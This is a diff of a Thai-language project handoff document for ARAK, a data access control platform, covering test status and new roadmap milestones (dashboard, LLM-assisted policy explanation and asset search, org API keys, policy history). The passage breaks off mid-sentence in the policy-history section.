@@ -1,9 +1,11 @@
 # HANDOFF — ARAK (Data Access Control Platform)
 
-> อัปเดต: 2026-09-23 · commit ล่าสุดที่ push สำเร็จ `e3aaa52` · **local นำหน้าอยู่หลาย commit — `git push` ยังค้าง ดู What Didn't Work** · repo https://github.com/sakanarm/ARAK (**public**)
+> อัปเดต: 2026-09-24 · commit ล่าสุดที่ push สำเร็จ `e3aaa52` · **local นำหน้าอยู่หลาย commit — `git push` ยังค้าง ดู What Didn't Work** · repo https://github.com/sakanarm/ARAK (**public**)
 >
 > อ่านคู่กับ **[docs/DESIGN.md](docs/DESIGN.md)** — ไฟล์นั้นคือ requirement + feature catalogue + สถานะครบทุกข้อ
 > ไฟล์นี้บอกเฉพาะ "ทำถึงไหน จะไปต่อยังไง อะไรที่ลองแล้วไม่เวิร์ค"
+>
+> **[docs/policy-conflict-resolution.md](docs/policy-conflict-resolution.md)** — กติกาการชนกันของ policy ฉบับอธิบายผู้ใช้ (ภาษาไทย + ตัวอย่าง 6 เคส) ผู้ใช้ขอไว้สำหรับเอาไปอธิบายทีม · ฝั่ง spec อยู่ที่ [docs/policy-spec.md](docs/policy-spec.md)
 
 ---
 
@@ -35,6 +37,15 @@ Phase 1 รองรับ SQL Server + PostgreSQL · identity หลักค�
 | **M7b Cross-mode consistency** | ⬜ — ต้องมี M5/M6 ก่อน |
 | **M8 Audit + Ops** | 🚧 ~35% — **FR-7 ปิดครบวงรอบนี้ (grant ตรงระดับ table + auto-revoke + audit trail + หน้าจอ) ดูข้อ AD.1** · `audit_query` / `audit_decision` / `audit_policy_change` เขียนจริงแล้วและอ่านได้ · **`evaluation_ms` มีค่าแล้ว (ข้อ AE.5)** · **ยังไม่มี audit ของการ configure** (เปลี่ยน data source / OM settings ไม่ถูกบันทึกที่ไหนเลย) · ยังไม่มี compliance report / drift detector / auto-revoke / SIEM export |
 | **M9 Access Request Management** | ⬜ **Phase 2 — ยังไม่เริ่ม** · ขอสิทธิ์เองจาก catalog (duration + เหตุผล + purpose) · routing หา approver จาก `asset_owner` · approval chain หลายขั้น · access review / recertification ทุก 90 วัน · break-glass (TTL สั้น + alert) · inbox ของ approver + notification — **ทางเตรียมไว้แล้วตั้งแต่ Phase 1**: `grant.source` = `manual` \| `request` + `request_id` (V11) · `requiresApproval` / `approvers` / `validUntil` ใน policy model · auto-revoke + audit · `asset_owner` พร้อม route → **ต่อยอดได้เลยไม่ต้อง migrate** |
+| **M10 Access Control Dashboard** | ⬜ **Phase 2 — ออกแบบแล้ว ยังไม่เริ่ม** · หน้าเดียวที่ตอบว่า "ตอนนี้องค์กรคุมข้อมูลได้ดีแค่ไหน" · 4 แถว: **Coverage** (asset ที่มี tag PII แต่ไม่มี policy คุ้มครอง / % ของ asset ที่ enforce แล้ว) · **Exposure** (ใครเข้าถึง PII ได้บ้าง · grant ที่ใกล้หมดอายุ · สิทธิ์ที่ไม่ได้ใช้เกิน 90 วัน) · **Activity** (query ต่อวัน แยก EXECUTED/REJECTED/FAILED · top principal · top asset · เหตุผลที่ถูกปฏิเสธบ่อยที่สุด) · **Health** (enforcement state ต่อ source · drift · รอบ sync ล่าสุด · p95 ของ decision) — **ข้อมูลมีอยู่ครบแล้วทั้งหมด** (`audit_query`, `audit_decision`, `asset_facet`, `policy_binding`, `access_grant`, `enforcement_state`) → งานคือ query + หน้าจอ ไม่ต้อง migrate — ดูแบบเต็มที่ข้อ AM.4 |
+| **M11 LLM Assist** | 🚧 **~60%** — ตารางนี้เคยเขียนว่า "ยังไม่เริ่ม" ซึ่งไม่จริงแล้ว · **per-user gateway ใช้งานได้จริง** — แต่ละคนใส่ base URL + key ของตัวเองในหน้า Settings และเลือกเองว่าจะเปิดใช้ไหม (`llm_user_setting.base_url` + `api_key_cipher` Fernet · key ไม่เคยถูกส่งกลับ ตอบแค่ `hasOwnKey`) · `llm_provider.allow_personal` เป็น kill switch · ⚠️ `LlmResource.putUser` ตัดสิทธิ์ admin ให้แก้ได้แค่ `enabled` — **ไม่มีใครเขียน gateway ของคนอื่นได้ ห้ามผ่อน** · ทดสอบสดผ่านแล้ว (21 models + completion ด้วย key ของ `analyst_a` เอง) · เหลือฟีเจอร์จริงสองตัว: **NL→SQL** และ **ร่าง policy** ที่ออกมาเป็น `DRAFT` เท่านั้น (FR-2.6 — LLM ไม่มีสิทธิ์ activate เอง) — ดูข้อ AO.8/AO.9 |
+| **M12 Home ที่จัดเอง** | 🚧 **~90% — milestone ใหม่ ไม่อยู่ในแผนเดิม** · หน้าแรกจัดวางเองได้ต่อ account · 5 preset · 14 widget type (กราฟวาดเป็น SVG มือ ไม่มี chart library) · วาง **HTML / Note / Link / Video** ได้ · `V13__home_layout.sql` — ไม่มีแถว = default (ลบแถว = reset) · **default คนละใบตาม role**: governance ได้หน้าเดิม · Requestor ได้หน้า Search · ⚠️ **HTML ที่คนพิมพ์เอง = stored XSS** → `HomeLayoutValidator` ล้างทั้ง**ตอนเขียนและตอนอ่าน** **ห้ามมีทางเขียน `home_layout` ที่ไม่ผ่านตัวนี้** · เหลือ **persona** (ให้ admin ตั้ง default ต่อ Platform Role) ซึ่งผู้ใช้ขอไว้ — ดูข้อ AN |
+| **M13 Request access จากจุดที่โดนปฏิเสธ** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ตอนนี้ query ที่ติด policy ตอบแค่ *"Access to X is denied. finance-subscription did not apply: …"* แล้วจบ — คนอ่านรู้ว่าตัวเองไม่มีสิทธิ์ แต่ไม่รู้ว่า **ต้องไปขอใคร** · งานคือ: refusal ทุกใบต้องพก **asset FQN + policy ที่ปฏิเสธ + รายชื่อ approver ที่ resolve มาแล้ว** กลับมาด้วย แล้วหน้า Query ขึ้นปุ่ม **"ขอสิทธิ์กับเจ้าของ"** ที่เปิด request พร้อมกรอก asset / เหตุผล / SQL ที่พยายามรันไว้ให้แล้ว — ดูข้อ AP.1 |
+| **M14 Public API + Swagger + Org Key** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · เปิด ARAK ให้ระบบอื่นเรียกได้: **Swagger UI + OpenAPI spec** ที่ generate จาก resource จริง · **สร้าง policy** และ **query ตามสิทธิ์ที่ตัวเองมี** ผ่าน API ได้ · auth ด้วย **Org Key ที่มีวันหมดอายุบังคับ** — scope ต่อ key, ผูกกับ principal ที่ระบุ, สิทธิ์ของ key ไม่เกินสิทธิ์ของเจ้าของ — ดูข้อ AP.2 |
+| **M15 LLM อธิบาย policy และอธิบาย dashboard** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ต่อยอดจาก M11 ที่ per-user gateway ใช้ได้จริงแล้ว · **(ก)** admin เปิด policy ตัวหนึ่งแล้วกด "อธิบายให้ฟัง" — LLM แปล selector + subject rule + row filter + mask ออกมาเป็นภาษาคน พร้อมบอกว่า **จะถูก policy ชั้นบนทับตรงไหน** · **(ข)** หน้า Dashboard (M10) กดที่กราฟแล้วให้ LLM อ่านตัวเลขให้ฟังว่ามันแปลว่าอะไรและควรไปดูอะไรต่อ — ⚠️ **ส่ง metadata + ตัวเลขสรุปเท่านั้น ห้ามส่งแถวข้อมูลจริง และ LLM ยังไม่มีสิทธิ์ activate อะไรทั้งสิ้น** (FR-2.6) — ดูข้อ AP.3 |
+| **M16 LLM ช่วยหา asset จากสิ่งที่อยากได้** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ในหน้า Query เพิ่ม option ให้พิมพ์เป็นภาษาคนว่า *“อยากได้ข้อมูลผลิตภัณฑ์และราคา”* แล้ว LLM ไปค้นใน metadata (asset + column + description + tag + glossary term + domain) แล้วตอบกลับเป็น **ตาราง/คอลัมน์ที่น่าจะใช่ พร้อมเหตุผลว่าทำไม** · แต่ละตัวต้องบอกด้วยว่า **คุณ query ได้เลย** หรือ **ต้องไปขอสิทธิ์ก่อน** (ต่อปุ่มของ M13 ตรงนั้น) · ตัวที่ query ได้กดแล้วเติม SQL ร่างลงช่อง editor ให้เลย — ⚠️ **ค้นบน metadata เท่านั้น ห้ามส่งแถวข้อมูลจริงให้ LLM** และผลลัพธ์ต้อง **กรองด้วยสิทธิ์ของคนที่ถาม** ก่อนแสดง (ห้ามใช้ LLM เป็นช่องทางส่องว่ามีตารางอะไรอยู่บ้าง) — ดูข้อ AP.4 |
+| **M17 ประวัติย้อนหลังของ policy** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ชิป *`v13 · active`* ที่เห็นบนหน้า policy มาจาก `policy.version` + `policy.lifecycle_state` · **ประวัติเก็บครบอยู่แล้วใน `policy_version`** (append-only ตั้งแต่ V3 — `PolicyStore` เขียนทุกครั้งก่อนแก้แถวจริง เก็บ `document` ทั้งใบ + `lifecycle_state` + `changed_by` + `change_reason` + `changed_at`) และ `GET /v1/policies/{id}/versions` ก็เปิดอยู่ **แต่ไม่มีหน้าจอไหนเรียกมันเลย** (`fetchPolicyVersions` ใน `api/policies.ts` เขียนไว้แล้วแต่ไม่มีใครใช้) · งานคือ: **แท็บ History** บนหน้า policy · **diff ระหว่างสองเวอร์ชัน** · **rollback** (เขียนเวอร์ชันใหม่ทับ ไม่ใช่ลบของเก่า ตาม FR-9.2) · และ **`audit_policy_change` ที่ยังไม่มีใครเขียนลงไปเลยสักแถว** — ดูข้อ AP.5 |
+| **M18 รองรับ database type ใหม่ได้โดยไม่ต้องไล่แก้ 14 จุด** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ของที่แพงออกแบบถูกแล้ว (`PolicyDecision` ไม่มี SQL · `SqlDialect` เป็น interface · `engine_capability` เป็น data) **แต่ชื่อ engine ถูก hardcode อยู่ 14 ที่** — `CHECK (engine IN (...))` 2 migration · switch ใน `JdbcTargets` + `SourceProbe` + `QueryService.dialectFor()` · frontend อีก 6 ไฟล์ · ลืมจุดเดียว**ไม่ error ตอน compile** แต่พังตอน runtime · งานคือ **`SourceEngine` registry ตัวเดียว** ที่ถือ url template + driver + dialect + probe + introspection quirk แล้วให้ทุกจุดอ่านจากมัน → เพิ่ม engine = **class 1 ตัว + capability rows** — ดูข้อ AP.7 |
 
 **ที่รันอยู่ตอนนี้**
 | | |
@@ -45,19 +56,967 @@ Phase 1 รองรับ SQL Server + PostgreSQL · identity หลักค�
 | App DB (docker `dac-appdb`, postgres:16-alpine) | `:5432` db/user `dac` |
 | OpenMetadata ของทีม | `2.0.1` — sync ผ่าน **ingestion-bot JWT** (ดู What Didn't Work) |
 
-เทสต์ทั้งหมดเขียว — **backend unit รันครบเมื่อ 2026-09-23 16:00 → exit 0 · unit 480** (integration **128** ครั้งล่าสุด `-Pintegration verify` → BUILD SUCCESS), frontend `npx jest` + `npx tsc --noEmit` + `npx eslint src` + `vite build` รันใหม่ **2026-09-23** (**126/126** เขียว · tsc exit 0 · eslint สะอาด · build ผ่าน)
+เทสต์ทั้งหมดเขียว — **backend unit รันครบเมื่อ 2026-09-24 14:33 → exit 0 · unit 606 · Failures 0 Errors 0** (integration **132** ครั้งล่าสุด `-Pintegration verify` → BUILD SUCCESS), frontend `npx jest` + `npx tsc --noEmit` + `vite build` รันใหม่ **2026-09-24** (**24 suites / 161 tests** เขียว · tsc exit 0 · build 32.17s · `scripts/check-cursor-pointer.mjs` → *every &lt;button&gt; offers a hand*)
+
+> ⚠️ **`backend/dac-service/target/surefire-reports/com.mfec.dac.catalog.AssetStoreIT.txt` ยังแดงค้างอยู่ในโฟลเดอร์ — เป็นไฟล์เก่าจาก 2026-09-23 20:35 ก่อน commit `19b0503` ซึ่งคือ commit ที่แก้เคสนั้นพอดี** อย่าอ่านรายงานใน `target/` โดยไม่ดูเวลาไฟล์ — `mvn test` ไม่ล้างรายงานของคลาสที่รอบนี้ไม่ได้รัน
 
 | ชุด | จำนวน | คำสั่ง |
 |---|---|---|
-| Backend unit | dac-common 6 · dac-engine **277** · dac-compiler-sql **25 (+18 รอบนี้ — `ViewCompilerTest`)** · dac-connector-openmetadata 88 · dac-proxy 16 · dac-service **86** = **498** | `./mvnw -am -pl backend/dac-service test` |
-| Backend integration (Testcontainers `postgres:16-alpine`) | **128 tests** — `AssetStoreIT` 6 · `CatalogQueryIT` 15 · `DataSourceStoreIT` 13 · `GovernanceStoreIT` 10 · `GrantCompositionIT` **17 (+4 รอบนี้: `AgainstDataPolicies` — grant ตรงต้องไม่ถอด mask)** · `IdentityAdminStoreIT` 15 · `ImpactAnalysisIT` 8 · `PolicyBindingMaterializerIT` 10 · `PolicyOverviewIT` 24 · `PolicyStoreIT` 10 | `./mvnw -am -pl backend/dac-service verify -Pintegration` |
-| Frontend | **21 suites / 126 tests** (+`ProfilePage.test.tsx` 3 — attribute ของตัวเอง) | `npx jest` ใน `frontend/app` |
+| Backend unit | dac-common 6 · dac-engine 277 · dac-compiler-sql 25 · dac-connector-openmetadata 91 · **dac-connector-source 11 (ใหม่ — `CredentialResolverTest`)** · dac-proxy 16 · **dac-service 180** = **606** | `./mvnw -o test` |
+| Backend integration (Testcontainers `postgres:16-alpine`) | **132 tests** — `AssetStoreIT` 7 · `CatalogQueryIT` 18 · `DataSourceStoreIT` 13 · `GovernanceStoreIT` 10 · `GrantCompositionIT` **17 (+4 รอบก่อน: `AgainstDataPolicies` — grant ตรงต้องไม่ถอด mask)** · `IdentityAdminStoreIT` 15 · `ImpactAnalysisIT` 8 · `PolicyBindingMaterializerIT` 10 · `PolicyOverviewIT` 24 · `PolicyStoreIT` 10 | `./mvnw -am -pl backend/dac-service verify -Pintegration` |
+| Frontend | **24 suites / 161 tests** (+`OpenMetadataSettingsPage.test.tsx` 5 — สัญญาเรื่องช่องความลับ) | `npx jest` ใน `frontend/app` |
 
 `yarn type-check` · `yarn lint` · `yarn build` ผ่านหมด → **BUILD SUCCESS** ทั้งสองฝั่ง
 
 ---
 
-## รอบนี้ — 🐛 **บั๊กจริงที่ลบข้อมูลทดสอบทิ้งทั้งชุด (`demo-pg` หาย + query ถูกปฏิเสธ)** · **Query Explorer เห็นเฉพาะ source ที่ต่อไว้จริง** · และ **Roadmap เพิ่ม M9 Access Request Management**
+## Roadmap ที่เพิ่มรอบนี้ — **M13 · M14 · M15 · M16 · M17 · M18** (ผู้ใช้ขอ 2026-09-24)
+
+ผู้ใช้สั่งว่า *"ช่วยเพิ่ม Roadmap เพิ่ม Access Control ให้เรามีความพิเศษ"* แล้วให้มาสามข้อ
+แล้วขอเพิ่มข้อที่สี่ ห้า และหกตามมาในวันเดียวกัน (M16, M17, M18)
+ทั้งหกข้อไม่ใช่ของประดับ — แต่ละข้อปิดรูที่ **มีอยู่จริงและวัดได้** ในของที่รันอยู่ตอนนี้
+
+### AP.1 M13 — Request access จากจุดที่โดนปฏิเสธ
+
+**รูที่มีอยู่จริง** — ยิง query จริงเมื่อกี้ได้คำตอบนี้กลับมา:
+
+```
+POST /api/v1/query  {"sourceId":"…","sql":"SELECT * FROM sales.customer"}
+→ "Access to demo-pg.salesdb.sales.customer is denied.
+   finance-subscription did not apply: outside the policy's permitted time window"
+```
+
+ข้อความนี้ถูกต้องและอธิบายได้ (FR-5.4 ทำงาน) **แต่มันเป็นทางตัน** — คนอ่านรู้ว่าตัวเองไม่มีสิทธิ์
+แล้วต้องไปเดาเองว่าใครเป็นเจ้าของ table นี้ แล้วเดินไปถามใน Teams ซึ่งเป็นขั้นตอนที่หลุดจากระบบทั้งหมด
+และ audit ตอบไม่ได้ว่าใครเคยขออะไรไว้บ้าง
+
+**สิ่งที่ต้องทำ**
+
+| ชั้น | งาน |
+|---|---|
+| Engine | `PolicyDecision` มี `reasons()` อยู่แล้ว — ต้องพา **policy id + scope level** ที่ปฏิเสธติดมาถึง response ไม่ใช่แค่ string |
+| API | refusal body เพิ่ม `assetFqn`, `deniedBy[]`, `approvers[]` (resolve จาก `asset_owner` ที่ crawl มาแล้ว) และ `requestable: true\|false` |
+| UI | หน้า Query: กล่อง refusal ขึ้นปุ่ม **"ขอสิทธิ์กับเจ้าของ"** → เปิดฟอร์มที่กรอก asset / policy ที่ติด / SQL ที่พยายามรัน / ช่องเหตุผล + purpose + duration ไว้ให้แล้ว |
+| หน้า Catalog | ปุ่มเดียวกันบนหน้า asset สำหรับคนที่ยังไม่ได้ลองยิง query |
+
+⚠️ **ขึ้นกับ M9** — ปลายทางของปุ่มคือ `access_request` ที่ M9 จะสร้าง ทางเตรียมไว้หมดแล้ว
+(`grant.source` = `manual` \| `request` + `request_id` nullable ตั้งแต่ V11 · `asset_owner` พร้อม route)
+→ **ทำ M13 พร้อม M9 เป็นชิ้นเดียวกัน** อย่าทำแยก ไม่งั้นได้ปุ่มที่กดแล้วไม่มีอะไรรับ
+
+⚠️ **ข้อที่ต้องระวัง** — refusal ที่บอกว่า "ไปขอคนนี้" คือการ**เปิดเผยว่า asset นี้มีอยู่จริง**
+ให้คนที่ไม่มีสิทธิ์เห็น ถ้า asset บางตัวเป็นความลับระดับที่ห้ามรู้แม้กระทั่งว่ามันมีอยู่
+ต้องมี flag ต่อ policy ว่า **ปฏิเสธแบบไม่บอกอะไรเลย** (ตอนนี้ยังไม่มี)
+
+### AP.2 M14 — Public API + Swagger + Org Key
+
+**รูที่มีอยู่จริง** — ทุก endpoint ของ ARAK auth ด้วย **JWT ที่ได้จาก `POST /v1/auth/login` เท่านั้น**
+ซึ่งแปลว่าระบบอื่นจะเรียก ARAK ได้ต้องเอา **password ของคนจริง** ไปฝังไว้ ซึ่งผิดทุกข้อ
+และตอนนี้ยัง**ไม่มี OpenAPI spec ของ API เราเอง** (ที่ pin ไว้ใน repo คือ swagger ของ **OpenMetadata** คนละตัวกัน)
+
+**สิ่งที่ต้องทำ**
+
+| ชั้น | งาน |
+|---|---|
+| Spec | ผูก `dropwizard-swagger` / `swagger-jaxrs2` generate OpenAPI จาก resource จริง + เสิร์ฟ Swagger UI ที่ `/api/openapi` — **generate จากโค้ด ห้ามเขียน spec มือ** ไม่งั้นมันจะไม่ตรงภายในสองสัปดาห์ |
+| Migration | `org_api_key` — `id` · `label` · `key_hash` · `principal_id` FK · `scopes text[]` · `expires_at NOT NULL` · `created_by` · `last_used_at` · `revoked_at` |
+| Auth filter | `X-ARAK-Key` → hash → lookup → เช็ค `expires_at` → ผูกเป็น `AuthenticatedUser` ตัวเดิม |
+| Scope | อย่างน้อย `policy:read` · `policy:write` · `query:run` · `catalog:read` |
+| UI | หน้า Settings ออก key ได้ + โชว์ key **ครั้งเดียวตอนสร้าง** + ตารางบอกว่าแต่ละใบหมดอายุเมื่อไหร่/ใช้ล่าสุดเมื่อไหร่ + ปุ่ม revoke |
+
+⚠️ **กติกาที่ห้ามถอด**
+1. **เก็บเป็น hash เท่านั้น** (Argon2id หรือ SHA-256 + salt) — DB ที่หลุดต้องไม่แปลว่า key หลุด
+2. **`expires_at` เป็น NOT NULL** ตามที่ผู้ใช้สั่ง — ห้ามมี key ที่ไม่มีวันตาย
+3. **key ไม่เพิ่มสิทธิ์ให้ใคร** — สิทธิ์ที่แท้จริง = `scopes ∩ สิทธิ์ของ principal เจ้าของ key`
+   key ของ Requester สร้าง policy ไม่ได้ ต่อให้ขอ scope `policy:write` มา
+4. **query ผ่าน key ต้องวิ่งผ่าน `QueryService` ตัวเดิม** — policy เดิม, audit เดิม, cap เดิม
+   ห้ามมีทางลัดที่ข้าม PolicyEngine เด็ดขาด
+5. **ทุกการใช้ key ลง `audit_query` / `audit_decision` พร้อมบอกว่ามาทาง key ใบไหน**
+
+### AP.3 M15 — LLM อธิบาย policy และอธิบาย dashboard
+
+**รูที่มีอยู่จริง** — หน้า `/policies/:id` ตอนนี้แสดง selector, subject rule, row filter, mask
+ได้ครบและถูกต้อง แต่มันแสดงเป็น **โครงสร้าง** ไม่ใช่ **คำอธิบาย** — คนที่ไม่ได้เขียน policy ตัวนั้นเอง
+ต้องนั่งประกอบในหัวว่าเจ็ดชั้นรวมกันแล้วแปลว่าอะไร ซึ่งเป็นสิ่งที่ FR-5.1 บอกเองว่า
+**คนทำไม่ได้อย่างน่าเชื่อถือ**
+
+**(ก) อธิบาย policy** — ปุ่มในหน้า `/policies/:id` และในหน้า asset
+ส่งให้ LLM: policy JSON + ชั้นที่มันอยู่ + policy ชั้นอื่นที่ match asset เดียวกัน + capability matrix
+ได้กลับมา: ย่อหน้าภาษาคนว่า *ใครเห็นอะไร ไม่เห็นอะไร เพราะอะไร* + **คำเตือนว่าข้อไหนจะถูกชั้นบนทับ**
+
+**(ข) อธิบาย dashboard** — ปุ่มบนแต่ละกราฟใน M10
+ส่งให้ LLM: **ตัวเลขสรุปของกราฟนั้น** + นิยามของ metric
+ได้กลับมา: มันแปลว่าอะไร ผิดปกติตรงไหน ควรไปดู asset/principal ตัวไหนต่อ
+
+⚠️ **กติกาที่ห้ามถอด (ต่อจาก FR-2.6 และของเดิมใน `AssistPrompts`)**
+1. **ส่ง metadata และตัวเลขสรุปเท่านั้น ห้ามส่งแถวข้อมูลจริงแม้แต่แถวเดียว** — บังคับด้วยโครงสร้าง
+   เหมือนที่ `AssistPromptsTest.carriesNoValues` ทำอยู่ ไม่ใช่ด้วยการเตือนใน prompt
+2. **LLM ไม่มี write path** — อธิบายได้อย่างเดียว activate/แก้ policy ไม่ได้
+3. **คำอธิบายไม่ใช่คำตัดสิน** — หน้าจอต้องเขียนกำกับว่านี่คือคำอธิบายที่ LLM สร้าง
+   ของจริงคือ **simulator (FR-5.2)** ที่คำนวณจาก engine จริง ห้ามให้คนเข้าใจสลับกัน
+4. **ยังเป็น per-user gateway** — ใช้ key ของคนที่กด ไม่ใช่ key กลาง (ตามที่ผู้ใช้สั่งไว้ที่ AO.8)
+   ใครไม่ได้ตั้ง gateway ไว้ ปุ่มนี้ไม่ขึ้น และ**ทุกอย่างอื่นในหน้าต้องใช้ได้ตามปกติ**
+
+### AP.4 M16 — LLM ช่วยหา asset จากสิ่งที่อยากได้
+
+> `ทำ option ใน Query ให้สามารถใช้ LLM ช่วยค้นหา Asset ตามที่ user อยากได้`
+> `เช่น user พิมพ์ว่าอยากได้ข้อมูล ผลิตภัณฑ์ และราคา LLM จะไปหาใน Metadata ให้`
+> `แล้ว Suggest table ที่ต้อง Query หรือที่ต้องขอเพิ่มเติมมาให้`
+
+**รูที่มีอยู่จริง** — ช่อง Search ในหน้า Catalog ตอนนี้เป็น keyword match ตรงๆ (`SearchQuery`)
+คนที่รู้อยู่แล้วว่าตารางชื่อ `customer` ก็หาเจอ แต่คนที่รู้แค่ว่า *"อยากได้ราคาสินค้า"* ต้องเดาคำ
+ว่าองค์กรนี้เรียกมันว่า `price` / `unit_price` / `list_amt` / `mst_prod_prc` — และถ้าเดาผิดก็สรุปว่า
+"ไม่มีข้อมูล" ทั้งที่มี นี่คือปัญหาที่ metadata มีคำตอบอยู่แล้ว (description, tag, glossary term,
+domain, column comment) แต่ไม่มีอะไรอ่านมันให้
+
+**สิ่งที่จะทำ**
+
+1. หน้า Query เพิ่มโหมด **"บอกสิ่งที่อยากได้"** ข้างๆ ช่อง SQL (เป็น option ไม่ใช่ตัวบังคับ —
+   คนที่เขียน SQL เป็นอยู่แล้วต้องไม่ถูกขวาง)
+2. Backend รับประโยค → **ค้น metadata ก่อน ไม่ใช่ส่งให้ LLM ก่อน**:
+   keyword + trigram บน `asset.name` / `asset.description` / `asset_column.name` /
+   `asset_column.description` / `asset_facet` (tag · glossary term · domain) → ได้ candidate ~50 ตัว
+3. **กรองด้วยสิทธิ์ของคนที่ถามทันทีตรงนี้** แล้วแบ่งเป็นสองกอง:
+   - **กองที่ query ได้เลย** — `QueryService` ตอบ allow
+   - **กองที่ต้องขอสิทธิ์** — asset มีอยู่จริงและตรงคำถาม แต่ policy ปฏิเสธ
+4. ส่ง **เฉพาะ metadata ของ candidate** ให้ LLM จัดอันดับและเขียนเหตุผล
+   (ชื่อ · description · dtype · tag · term — **ไม่มีค่าในตารางแม้แต่แถวเดียว**)
+5. ผลลัพธ์บนหน้าจอเป็นการ์ดต่อ asset: ชื่อ · ทำไมถึงน่าจะใช่ · คอลัมน์ที่เกี่ยวข้อง และปุ่ม
+   - query ได้ → **"ใส่ SQL ให้"** เติม `SELECT <คอลัมน์ที่แนะนำ> FROM <fqn>` ลง editor
+   - ยังไม่มีสิทธิ์ → **"ขอสิทธิ์กับเจ้าของ"** ซึ่งคือปุ่มตัวเดียวกับ M13
+
+**สามข้อที่ห้ามผ่อน**
+
+1. **LLM เห็นแค่ metadata** — ห้ามส่งแถวข้อมูล ห้ามส่ง sample value
+   (กฎเดียวกับ `AssistPrompts` ที่มี `AssistPromptsTest.carriesNoValues` ยันอยู่แล้ว)
+2. **กรองสิทธิ์ก่อนถาม LLM ไม่ใช่หลัง** — ถ้าปล่อยให้ LLM เห็น candidate ทั้งหมดแล้วค่อยกรอง
+   ทีหลัง ฟีเจอร์นี้จะกลายเป็นช่องส่องว่าองค์กรมีตารางอะไรอยู่บ้าง ซึ่งเป็นข้อมูลที่ policy
+   ตั้งใจปิด
+   ⚠️ **แต่กองที่สอง (ต้องขอสิทธิ์) ตั้งใจเปิดเผยว่า asset นั้นมีอยู่** — เป็นเรื่องเดียวกับความเสี่ยง
+   ที่บันทึกไว้ที่ AP.1 และต้องใช้ flag ตัวเดียวกัน (policy ที่ตั้งเป็น "ปฏิเสธโดยไม่บอกอะไรเลย"
+   ต้องหายไปจากผลการค้นด้วย ไม่ใช่โผล่ในกองที่สอง) — **flag นี้ยังไม่มี ต้องทำพร้อมกัน**
+3. **ยังเป็น per-user gateway** — ใช้ key ของคนที่กด ใครไม่ได้ตั้ง gateway ไว้ โหมดนี้ไม่ขึ้น
+   และช่อง SQL ปกติต้องใช้ได้ครบเหมือนเดิม
+
+**ของที่มีอยู่แล้วและต่อยอดได้ทันที** — `SearchQuery` (keyword) · `CatalogQuery` (schema brief
+ที่ `LlmAssistResource` ใช้อยู่) · `QueryService` (ตัวตัดสินว่า allow ไหม) · `asset_facet` ที่กาง
+ancestor ไว้แล้ว → งานใหม่จริงๆ คือ **ตัวจัดอันดับ + การ์ดผลลัพธ์ + การแบ่งสองกอง**
+
+### AP.5 M17 — ประวัติย้อนหลังของ policy
+
+> `v13 · active ที่เก็บของ policy นี่เก็บไว้ที่ไหนอะ เพิ่ม Roadmap ให้สามารถดูย้อนหลังได้`
+
+**คำตอบก่อน: เก็บอยู่แล้ว และเก็บครบ**
+
+| สิ่งที่เห็น | มาจาก |
+|---|---|
+| `v13` | `policy.version` — เลขปัจจุบัน บวกทีละ 1 ทุกครั้งที่บันทึก |
+| `active` | `policy.lifecycle_state` — `DRAFT` / `PENDING_APPROVAL` / `ACTIVE` / `DISABLED` / `ARCHIVED` |
+| **ของเก่าทุกเวอร์ชัน** | **`policy_version`** (มาตั้งแต่ `V3__policy.sql`) — `UNIQUE (policy_id, version)` เก็บ `document` **ทั้งใบ** + `lifecycle_state` ณ ตอนนั้น + `changed_by` + `change_reason` + `changed_at` |
+
+`PolicyStore` เขียน `policy_version` **ก่อน** แก้แถวจริงทุกครั้ง (class doc เขียนไว้ว่า
+*"Every write appends to `policy_version` before it changes …"*) เป็น append-only —
+rollback ตาม FR-9.2 ต้อง**เขียนเวอร์ชันใหม่** ไม่ใช่ลบหรือแก้ของเก่า เพื่อให้คำถามว่า
+"ตอนวันที่ X policy หน้าตาเป็นยังไง" ตอบได้เสมอ
+
+**รูที่มีอยู่จริง — ข้อมูลมี แต่ไม่มีทางดู**
+
+1. `GET /v1/policies/{id}/versions` เปิดอยู่แล้ว (`PolicyResource:109`) และ
+   `fetchPolicyVersions()` เขียนไว้แล้วใน `frontend/app/src/api/policies.ts:139`
+   — **แต่ไม่มี component ไหนเรียกมันเลยสักที่** ค้นทั้ง `frontend/app/src` แล้วเจอแค่บรรทัดที่ประกาศ
+2. `PolicyStore.history()` **SELECT `change_reason` มาแล้วทิ้ง** — map ลง `StoredPolicy`
+   ไม่มีช่องให้มัน เหตุผลที่คนกรอกตอนแก้ policy จึงถูกเก็บลง DB แต่ไม่เคยถูกอ่านกลับ
+3. **`audit_policy_change` ยังไม่มีใครเขียนลงไปเลยสักแถว** — `grep` ทั้ง `src/main` ไม่เจอ
+   ตารางมีตั้งแต่ V3 แต่ว่างเปล่า (FR-8.1 ยังไม่ปิด)
+4. ไม่มี **diff** — ต่อให้เปิดสองเวอร์ชันมาดู ก็ต้องอ่าน JSON เทียบเอง
+5. ไม่มีปุ่ม **rollback**
+
+**สิ่งที่จะทำ**
+
+1. **แท็บ History** บนหน้า policy detail: ไทม์ไลน์ `v13 → v12 → v11 …` แต่ละแถวบอก
+   **ใคร · เมื่อไหร่ · state ตอนนั้น · เหตุผลที่กรอกไว้**
+2. **แก้ `PolicyStore.history()` ให้ส่ง `change_reason` กลับมาจริง** (เพิ่มช่องใน `StoredPolicy`
+   หรือทำ record แยกสำหรับหน้า history — น่าจะแยกดีกว่า เพราะ `StoredPolicy` ตอนนี้ถูกยัด
+   `null` สองช่องเพื่อให้ใช้ซ้ำได้ ซึ่งอ่านยากอยู่แล้ว)
+3. **Diff สองเวอร์ชัน** — เทียบที่ระดับ *ความหมาย* ไม่ใช่ระดับ text: selector เปลี่ยนจากอะไรเป็นอะไร
+   · subject rule เพิ่ม/ลดเงื่อนไขข้อไหน · row filter · column mask ตัวไหนเข้มขึ้น/ผ่อนลง
+   (diff ของ JSON ดิบจะเต็มไปด้วยการสลับลำดับ key ที่ไม่ได้แปลว่าอะไร)
+4. **Rollback** — `POST /v1/policies/{id}/rollback/{version}` เขียนเป็น **เวอร์ชันใหม่**
+   พร้อมบังคับกรอกเหตุผล · สิทธิ์เท่ากับการแก้ policy · ถ้า policy กำลัง `ACTIVE` ต้อง
